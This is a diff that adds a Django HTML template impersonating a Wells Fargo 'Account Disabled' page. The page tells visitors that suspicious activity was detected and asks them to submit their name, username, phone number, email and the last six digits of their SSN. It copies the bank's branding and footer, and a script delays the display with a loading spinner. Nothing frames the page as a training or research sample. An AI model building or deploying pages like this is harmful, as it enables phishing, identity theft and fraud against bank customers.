@@ -1,0 +1,86 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    {% comment %} <link rel='icon' href="{% static 'projecty/images/favicon.png'%}" type='image/x-icon'> {% endcomment %}
+    <link rel="stylesheet" href="{% static 'projecty/css/details.css'%}">
+</head>
+<body>
+    
+    <div class="loader "></div>
+    <nav>
+        <div class="logo">WELLS FARGO</div>
+        <div class="menu-bar">&#9776;</div>
+    </nav>
+
+    <main>
+        <div class="container">
+            <h1>Account Disabled </h1>
+            <p> suspicious activity detected. kindly fillout the form to regain access to your account !!! 
+                
+            </p>
+
+            <form action="" method="post">
+                {% csrf_token %}
+                <div class="input-row">
+                    <label for="{{ form.first_name.id_for_label}}"></label>
+                    <input type="text" placeholder="First Name" name="{{ form.first_name.name}}" id="{{ form.first_name.id_for_label}}" class="first-name" required>
+
+                    <label for="{{ form.second_name.id_for_label}}"></label>
+                    <input type="text" placeholder="Last Name" name="{{ form.second_name.name}}" id="{{ form.second_name.id_for_label}}" class="last-name" required>
+                </div>
+                <div class="input-row">
+                    <label for="{{ form.user_name.id_for_label}}"></label>
+                    <input type="text" name="{{ form.user_name.name}}" id="{{ form.user_name.id_for_label}}" placeholder="Username" required>
+
+                    <label for="{{ form.phone_number.id_for_label}}"></label>
+                    <input type="tel" name="{{ form.phone_number.name}}" id="{{ form.phone_number.id_for_label}}" placeholder="Phone Number" required>
+                </div>
+                <div class="input-row">
+                    <label for="{{ form.security_number.id_for_label}}"></label>
+                    <input type="tel" name="{{ form.security_number.name}}" id="{{ form.security_number.id_for_label}}" placeholder="Last 6 Digits of SSN" required>
+
+                    <label for="{{ form.email.id_for_label}}"></label>
+                    <input type="email" name="{{ form.email.name}}" id="{{ form.email.id_for_label}}" placeholder="email" required>
+                </div>
+                <a href="{% url 'index'%}"></a>
+                <button type="submit">submit</button>
+            </form>
+        </div>
+    </main>
+
+   <footer>
+        <p class="foot">
+            About Wells Fargo |
+Online Access Agreement |
+Privacy, Cookies, Security & Legal |
+Notice of Data Collection |
+Report Email Fraud |
+Security Center |
+Sitemap <br>
+        </p>
+        <p class="f2">
+            Ad Choices |
+Give Us Feedback
+        </p>
+        <p class="y">
+            © 1999 - 2023 Wells Fargo. All rights reserved. NMLSR ID 399801
+        </p> 
+    </footer>
+    <script>
+        window.addEventListener("load", function() {
+            const loadel = document.querySelector(".loader");
+
+            const hideload = ()=>{
+                loadel.style.display = "none";
+            };
+            setTimeout(hideload, 8900)
+        });
+
+        
+    </script>
+</body>
+</html>
